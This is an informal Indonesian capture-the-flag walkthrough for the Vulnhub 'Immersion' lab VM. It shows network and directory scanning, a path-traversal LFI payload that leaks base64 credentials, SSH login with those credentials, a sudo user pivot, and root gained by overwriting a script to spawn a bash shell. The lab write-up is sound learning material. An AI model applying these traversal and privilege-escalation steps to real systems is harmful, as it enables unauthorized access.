@@ -1,0 +1,30 @@
+Walkthrough Immersion Vulnhub
+Ip address : 192.168.88.151
+Link : https://www.vulnhub.com/entry/colddworld-immersion,668/
+
+1. Oke gan kembali lagi wkwk, Oke kali ini gua main di server vulnhub lagi dan sudah tentu pastinya gua dibantu oleh writeup orang lain akwowk. Oke pertama seperti biasa saya netdiscover ip di lingkup gua:
+Command : sudo netdiscover -i eth0 -r 192.168.88.0/24
+Ouput : 192.168.88.151  08:00:27:22:e5:01     10     600  PCS Systemtechnik GmbH  (Virtual Box)
+
+2. Next gua nmap untuk tahu apa saja port yang terbuka disana :
+Command : sudo nmap -sS -sV -sC vulners -A -p- 192.168.88.151
+Output : Terbuka port 80 dan 3032 (ssh)
+
+3. Next bruteforce directory dengan gobuster
+Command : gobuster dir -u http://192.168.88.151/ -w /home/kiyo/Downloads/medium.txt
+Ouput : login, wp, secure, js
+
+4. Next gua ke 192.168.88.151/login, dan gua buka sourcenya ternyata disana ada clue yaitu dimana LFI nya di params page dan filenya di /var/carls.txt. Oke akhirnya gua eksekusi
+Command : http://192.168.88.151/login/account.php?page=../../../../var/carls.txt 
+Output : carls:Y2FybG9z
+Oke untuk ini decode dulu ke base64 dan dapet password carlos, Oya gua bisa tau ada di account karena gua coba untuk login dan hasilnya vulnya terdapat di file account.php
+
+5. Yokay , waktunya akses ssh dengan carls , ssh carls@192.168.88.151 -p 3032 dengan password carlos
+
+6. Oke pertama yang gua coba dimana gua nyoba sudo -l dan ternyata harus login ke c0ldd maka yang gua lakuin sudo -u c0ldd /bin/bash. Dan disana terdapat flag user.txt
+Ouput : TXV5IGJpZW4gaGVjaG8gOik= (Jangan lupa decrypt ke base64)
+
+7. Next karena untuk ke root terletak di vuln /home/c0ldd/DoNotRun.py. Karena itu gua ubah isinya menjadi 'import os;os.system("/bin/bash")'. Dan dapet lah akses root
+
+8. Paraparapampam,  dan gua dapet flag nya ternyata di /root 
+Output : RmVsaWNpZGFkZXMgY3JhY2s= (decrypt dulu bos ke base64)
